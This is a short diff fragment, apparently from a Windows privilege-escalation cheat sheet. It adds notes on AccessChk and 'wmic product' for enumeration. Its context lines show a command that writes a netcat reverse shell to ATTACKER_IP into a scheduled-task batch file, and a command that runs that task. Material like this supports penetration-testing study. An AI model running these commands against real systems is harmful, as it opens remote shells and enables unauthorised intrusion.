@@ -93,6 +93,10 @@ echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat // nc6
 schtasks /run /tn vulntask // to run a schtask
 
 
+~~AccessChk // tool used to check a service DACL from cmd
+~~wmic product //to list down all software nad version installed on the target system
+
+
     
 
 
